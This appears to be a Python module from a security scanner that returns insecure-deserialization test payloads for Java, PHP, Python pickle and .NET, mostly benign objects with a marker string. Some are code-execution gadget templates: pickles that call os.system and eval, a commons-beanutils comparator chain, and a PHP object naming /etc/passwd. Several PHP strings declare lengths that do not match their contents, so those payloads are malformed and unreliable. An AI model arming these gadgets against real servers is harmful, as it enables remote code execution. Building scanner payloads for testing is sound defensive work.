"""
Insecure Deserialization payload collection with enhanced detection
"""

import base64

class DeserializationPayloads:
    """Insecure Deserialization payload collection"""
    
    @staticmethod
    def get_java_payloads():
        """Get Java deserialization payloads"""
        return [
            # Java serialized HashMap with marker
            'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAAQZGVzZXJfbWFya2VyX2phdmF0ABJkZXNlcmlhbGl6YXRpb25fdGVzdHg=',
            
            # Java serialized ArrayList with marker
            'rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAABdAAQZGVzZXJfbWFya2VyX2phdmF4',
            
            # Java serialized String with marker
            'rO0ABXQAEGRlc2VyX21hcmtlcl9qYXZh',
            
            # Malicious Java payload (safe marker version)
            'rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAABc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgA/b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmNvbXBhcmF0b3JzLkNvbXBhcmFibGVDb21wYXJhdG9y79yg27Ek2u4CAAB4cHQAEGRlc2VyX21hcmtlcl9qYXZh'
        ]
    
    @staticmethod
    def get_php_payloads():
        """Get PHP deserialization payloads"""
        return [
            # PHP serialized object with marker
            'O:8:"stdClass":1:{s:11:"deser_marker";s:18:"deserialization_test";}',
            
            # PHP serialized array with marker
            'a:2:{s:11:"deser_marker";s:18:"deserialization_test";s:4:"test";s:5:"value";}',
            
            # Base64 encoded PHP serialized object
            base64.b64encode(b'O:8:"stdClass":1:{s:11:"deser_marker";s:18:"deserialization_test";}').decode(),
            
            # PHP serialized object with potential RCE (safe marker version)
            'O:9:"Exception":1:{s:7:"message";s:11:"deser_marker";}',
            
            # PHP serialized object with file operations marker
            'O:8:"stdClass":2:{s:11:"deser_marker";s:18:"deserialization_test";s:4:"file";s:11:"/etc/passwd";}',
            
            # URL encoded PHP serialized object
            'O%3A8%3A%22stdClass%22%3A1%3A%7Bs%3A11%3A%22deser_marker%22%3Bs%3A18%3A%22deserialization_test%22%3B%7D'
        ]
    
    @staticmethod
    def get_python_payloads():
        """Get Python pickle deserialization payloads"""
        return [
            # Python pickle with marker (base64 encoded)
            'gANjX19idWlsdGluX18KZXZhbApxAFgLAAAAZGVzZXJfbWFya2VycQGFcQJScQMu',
            
            # Python pickle object with marker
            'gANjY29weV9yZWcKX3JlY29uc3RydWN0b3IKcQBjX19idWlsdGluX18Kb2JqZWN0CnEBaABOdFJxAlgLAAAAZGVzZXJfbWFya2VycQOGcQRScQUu',
            
            # Python pickle with reduce
            'gANjb3MKc3lzdGVtCnEAWAsAAABkZXNlcl9tYXJrZXJxAYVxAlJxAy4='
        ]
    
    @staticmethod
    def get_dotnet_payloads():
        """Get .NET deserialization payloads"""
        return [
            # .NET BinaryFormatter payload with marker
            'AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAAATU3lzdGVtLkNvbGxlY3Rpb25zLkhhc2h0YWJsZQcAAAAKTG9hZEZhY3RvcgdWZXJzaW9uCENvbXBhcmVyEEhhc2hDb2RlUHJvdmlkZXIISGFzaFNpemUES2V5cwZWYWx1ZXMAAAMDAAUFCwgIAgAAAAoAAAAJAwAAAAkEAAAACQUAAAAJBgAAAAMAAAAGBwAAAAtkZXNlcl9tYXJrZXIGCAAAABJkZXNlcmlhbGl6YXRpb25fdGVzdAs=',
            
            # .NET DataContractSerializer payload
            'PERhdGFDb250cmFjdD48ZGVzZXJfbWFya2VyPmRlc2VyaWFsaXphdGlvbl90ZXN0PC9kZXNlcl9tYXJrZXI+PC9EYXRhQ29udHJhY3Q+'
        ]
    
    @staticmethod
    def get_all_payloads():
        """Get all deserialization payloads"""
        payloads = []
        payloads.extend(DeserializationPayloads.get_java_payloads())
        payloads.extend(DeserializationPayloads.get_php_payloads())
        payloads.extend(DeserializationPayloads.get_python_payloads())
        payloads.extend(DeserializationPayloads.get_dotnet_payloads())
        return payloads
